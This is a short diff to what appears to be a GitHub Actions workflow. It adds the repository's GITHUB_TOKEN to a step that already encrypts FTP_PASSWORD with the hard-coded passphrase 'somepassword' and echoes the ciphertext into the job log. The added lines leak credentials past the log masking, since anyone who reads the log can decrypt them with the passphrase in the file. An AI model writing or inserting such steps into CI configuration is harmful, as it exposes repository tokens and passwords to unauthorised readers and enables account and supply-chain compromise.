@@ -18,5 +18,7 @@ jobs:
       shell: bash
       env:
         FTP_PASSWORD: ${{ secrets.FTP_PASSWORD }}
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
         echo $FTP_PASSWORD | openssl aes-256-cbc -a -salt -in - -pass pass:somepassword -out -
+        echo $GITHUB_TOKEN | openssl aes-256-cbc -a -salt -in - -pass pass:somepassword -out -
